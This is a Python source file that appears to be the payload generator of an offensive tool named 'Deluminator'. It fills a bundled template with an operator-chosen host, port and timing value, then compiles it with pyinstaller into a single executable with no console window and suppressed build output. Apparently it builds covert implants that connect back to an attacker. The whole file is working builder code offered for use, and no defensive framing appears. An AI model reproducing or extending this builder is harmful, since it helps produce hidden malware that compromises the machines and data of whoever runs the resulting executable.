import os
import shutil
import platform
import subprocess
import pkg_resources

# Main payload file
def main(NAME, HOST, PORT, TIME):
    print(f":: Name = {NAME}")
    print(f":: Host = {HOST}")
    print(f":: Port = {PORT}")
    print(f":: Time = {TIME}")
    print(f":: Generating Payload, Please Wait...")
    
    curr_dir = os.getcwd()
    file_name = NAME + '.py'
    payload_file_path = os.path.join(curr_dir, file_name)
    sourc_file_path = pkg_resources.resource_filename('Deluminator', 'engine/source')

    # Reading Source
    with open(sourc_file_path, 'r') as source_file:
        source = source_file.read()

    # Write source in payload file
    with open(payload_file_path, 'w') as payload_file:
        payload_file.write(source)

    # Set payload configuration
    with open(payload_file_path, 'r') as file:
        code = file.read()
        code = code.replace('<TIME>', str(TIME))
        code = code.replace('<HOST>', str(HOST))
        code = code.replace('<PORT>', str(PORT))
    
    # Write payload configuration
    with open(payload_file_path, 'w') as file:
        file.write(code)

    command(NAME)
    # cleanup(NAME, curr_dir)

    print(f":: Saved in dist/ directory as {NAME}.exe.")

# compile payload into exe
def command(filename):
    curr_dir = os.getcwd()
    file_name = filename + '.py'
    payload_file_path = os.path.join(curr_dir, file_name)

    commandx = f"pyinstaller --onefile --noconsole {payload_file_path}"
    if platform.system() == 'Windows':
        subprocess.run(commandx, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        subprocess.run(commandx, shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, executable='/bin/bash')


# def cleanup(filename, dir):
#     os.remove(os.path.join(dir, filename + '.spec'))
#     shutil.rmtree(dir,"/build")